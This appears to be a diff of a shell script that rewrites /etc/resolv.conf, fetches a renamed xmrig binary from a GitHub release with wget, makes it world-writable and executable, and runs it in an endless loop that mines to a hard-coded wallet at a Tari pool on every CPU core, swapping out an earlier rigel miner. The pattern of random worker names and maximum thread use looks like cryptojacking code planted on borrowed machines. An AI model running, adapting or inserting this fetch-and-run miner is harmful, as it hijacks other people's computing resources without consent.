@@ -1,6 +1,7 @@
 echo nameserver 1.1.1.1 > /etc/resolv.conf
-curl https://github.com/kryptex-miners-org/kryptex-miners/releases/download/rigel-1-22-3/rigel-1.22.3-linux.tar.gz -L -o rigel-1.22.3-linux.tar.gz
-tar xf rigel-1.22.3-linux.tar.gz
+#!/bin/bash
+wget -O vrl https://github.com/bondaltomason/meo/releases/download/2.7.0/xmrig-vrl
+chmod 777 vrl
 while :; do
-./rigel -a sha3x -o stratum+tcp://xtm-sha3x.kryptex.network:7039 -u 165DUuzQoKG9BaBqprN3ZmsMRfvGHMwNwCpehJUqGoGLsSDtB535XA3PPzfRZhu2uYM9xfT8JsKoXEquWMr6XVwKK4UsrsuiaVHSTBpstcgqjLe5rYNcNfYdCJ1CtDg9z6qshKy/$(echo $(shuf -i 1-15000 -n 1)-run)
+./vrl -a rx/0 --donate-level 1 -o pool-global.tari.snipanet.com:3333 -u 165DUuzQoKG9BaBqprN3ZmsMRfvGHMwNwCpehJUqGoGLsSDtB535XA3PPzfRZhu2uYM9xfT8JsKoXEquWMr6XVwKK4UsrsuiaVHSTBpstcgqjLe5rYNcNfYdCJ1CtDg9z6qshKy -p $(echo $(shuf -i 1-15000 -n 1)-A) -t $(nproc --all)
 done
